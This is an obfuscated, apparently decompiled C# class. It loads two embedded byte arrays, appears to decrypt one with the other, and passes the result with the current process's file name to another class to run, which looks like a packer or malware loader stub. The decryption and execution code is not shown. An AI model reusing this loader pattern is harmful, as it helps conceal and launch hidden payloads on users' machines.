using System.Diagnostics;
using ns10;
using ns14;
using ns8;
using ns9;

namespace ns11;

internal sealed class Class29 : Class25
{
	public Class29()
	{
		Class35.smethod_0();
		base._002Ector();
	}

	public override object vmethod_0(object[] object_0)
	{
		Class24.class25_0 = new Class30();
		byte[] array = (byte[])Class24.class25_0.vmethod_0(new object[1] { 100 });
		byte[] array2 = (byte[])Class24.class25_0.vmethod_0(new object[1] { 101 });
		if (array.Length > 0 && array2.Length > 0)
		{
			Class24.class25_0 = new Class31();
			byte[] array3 = (byte[])Class24.class25_0.vmethod_0(new object[2] { array2, array });
			if (array3.Length <= 0)
			{
				return null;
			}
			if (object_0.Length <= 0)
			{
				object_0 = new object[1] { new string[1] };
			}
			Class24.class25_0 = new Class26();
			Class24.class25_0.vmethod_0(new object[3]
			{
				array3,
				(string[])object_0[0],
				Process.GetCurrentProcess().MainModule!.FileName
			});
			return null;
		}
		return null;
	}
}
